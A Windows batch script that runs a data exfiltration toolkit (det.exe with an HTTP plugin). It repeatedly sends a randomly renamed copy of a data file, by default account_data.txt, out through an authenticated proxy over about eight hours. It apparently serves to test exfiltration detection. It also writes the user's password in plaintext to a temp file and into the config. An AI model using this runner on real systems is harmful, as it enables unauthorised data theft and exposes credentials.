@echo off
rem Optional argument 1: data file in det subfolder [default: account_data.txt]
rem Optional argument 1: count of cycles [default 80]
 
echo  Data exfiltration toolkit starting ...
 
rem variables
set exe="%cd%\det\det.exe"
set config="%cd%\det\config.json"
rem with default cycle_total of 80 should run at least 8 hours
set sleep_seconds=300
 
if "%~1"=="" (
    set data="%cd%\det\account_data.txt"
    ) else (
    set data="%cd%\det\%~1"
    )
if "%~2"=="" (
    set cycle_total=80
    ) else (
    set cycle_total=%~2
    )
 
rem sanity check
if not exist %exe% (
    echo Aborting, expected file not found: %exe%
    goto :EOF
)
if not exist %config% (
    echo Aborting, expected file not found: %config%
    goto :EOF
)
if not exist %data% (
    echo Aborting, expected file not found: %data%
    goto :EOF
)
 
rem prompt user for u id and password
echo  Please provide your windows credentials, used for http proxy authentication
set /p uid=Enter your u id:
powershell -Command $pword = read-host "Enter your password" -AsSecureString ; $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pword) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR) > .tmp.txt & set /p password=<.tmp.txt & del .tmp.txt
 
rem copy and rename data file
set suffix=_%RANDOM%.
call set copied_data=%%data:.=%suffix%%%
echo f | xcopy /f /y %data% %copied_data%
set data=%copied_data%
 
rem run data exfiltration with http plugin in loop
for /l %%x in (1, 1, %cycle_total%) do (
 
    @echo off
    rem replace http proxy username and password placeholders with user entries
    powershell -Command "(Get-Content -encoding UTF8 '%config%').replace('{proxy_user}','%uid%').replace('{proxy_password}','%password%') | Out-File -encoding UTF8 '%config%'"
 
    echo  "|\/\/\/|  "
    echo  "|      |  "
    echo  "|      |  "
    echo  "| (o)(o)  "
    echo  "C      _) "
    echo  " | ,___| ---- Sending data cycle #%%x out of %cycle_total%
    echo  " |   /    "
    echo  "/____\    "
    echo "/      \
 
    rem actual det execution
    @echo on
    %exe% -p hypertext-transfer-protocol -c %config% -f %data%
 
    @echo off
    rem replace proxy user and password with placeholders back
    powershell -Command "(Get-Content -encoding UTF8 '%config%').replace('\"proxy_user\": \"%uid%\"','\"proxy_user\": \"{proxy_user}\"').replace('\"proxy_password\": \"%password%\"','\"proxy_password\": \"{proxy_password}\"') | Out-File -encoding UTF8 '%config%'"
 
    if %%x LSS %cycle_total% (
        rem sleep for given seconds
        echo *** [Cycle %%x/%cycle_total% done] Sleeping for %sleep_seconds% seconds until next cycle. ***
        echo *** If you want, you can abort this application with CTRL+C ***
        TIMEOUT /T %sleep_seconds% /NOBREAK
    )
)
 
echo  Data exfiltration toolkit finishing ...